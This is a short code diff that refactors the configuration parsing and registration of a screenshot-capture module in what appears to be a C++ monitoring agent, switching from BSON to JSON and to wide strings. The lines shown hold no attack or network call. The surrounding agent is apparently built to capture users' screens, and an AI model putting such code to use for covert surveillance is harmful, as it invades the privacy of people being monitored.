@@ -71,12 +71,12 @@ DWORD __stdcall PM_SnapShotStartStop(BOOL bStartFlag, BOOL bReset)
 	return 1;
 }
 
-DWORD __stdcall PM_SnapShotInit(bson::be elem)
+DWORD __stdcall PM_SnapShotInit(JSONObject elem)
 {
-	capture_only_window = (BOOL) elem["onlywindow"].Bool();
-	if (!strcmp(elem["quality"].String().c_str(), "hi") ) {
+	capture_only_window = (BOOL) elem[L"onlywindow"]->AsBool();
+	if (!wcscmp(elem[L"quality"]->AsString().c_str(), L"hi") ) {
 		image_quality = SNAP_IMG_QUALITY_HI; 
-	} else if (!strcmp(elem["quality"].String().c_str(), "med") ) {
+	} else if (!wcscmp(elem[L"quality"]->AsString().c_str(), L"med") ) {
 		image_quality = SNAP_IMG_QUALITY_MED;
 	} else { 
 		image_quality = SNAP_IMG_QUALITY_LOW;
@@ -86,6 +86,6 @@ DWORD __stdcall PM_SnapShotInit(bson::be elem)
 
 void PM_SnapShotRegister()
 {
-	AM_MonitorRegisterBSON("snapshot", PM_SNAPSHOTAGENT, (BYTE *)NULL, (BYTE *)PM_SnapShotStartStop, (BYTE *)PM_SnapShotInit, NULL);
-	AM_MonitorRegisterBSON("new_window", PM_ONNEWWINDOW_IPC, (BYTE *)PM_NewWindowDispatch, (BYTE *)NULL, (BYTE *)NULL, NULL);
+	AM_MonitorRegisterBSON(L"snapshot", PM_SNAPSHOTAGENT, (BYTE *)NULL, (BYTE *)PM_SnapShotStartStop, (BYTE *)PM_SnapShotInit, NULL);
+	AM_MonitorRegisterBSON(L"new_window", PM_ONNEWWINDOW_IPC, (BYTE *)PM_NewWindowDispatch, (BYTE *)NULL, (BYTE *)NULL, NULL);
 }
